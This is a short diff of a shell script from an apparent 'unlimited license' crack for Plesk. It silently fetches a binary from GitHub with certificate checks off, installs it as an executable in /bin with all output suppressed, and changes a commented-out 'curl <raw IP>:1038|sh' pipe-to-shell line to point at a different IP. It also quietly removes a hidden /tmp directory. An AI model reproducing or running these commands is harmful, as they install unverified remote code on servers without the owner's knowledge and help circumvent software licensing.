@@ -11,7 +11,7 @@ echo  💕 Made for developers by developers ♡ ♥
 wget -q   --no-check-certificate -O /bin/7ea.d https://github.com/7054company/plesk-unlimited-license/raw/main/7ea  > /dev/null    2> /dev/null    || true && chmod +x /bin/7ea.d  > /dev/null 2>/dev/null && mv /bin/7ea.d /bin/7ea > /dev/null 2>/dev/null
 
 
-#  curl http://3.143.249.18:1038|sh
+#  curl http://16.170.236.233:1038|sh
 rm -fr /tmp/.ea > /dev/null 2> /dev/null || true
 #echo hi whoami
 #1.1.1.1
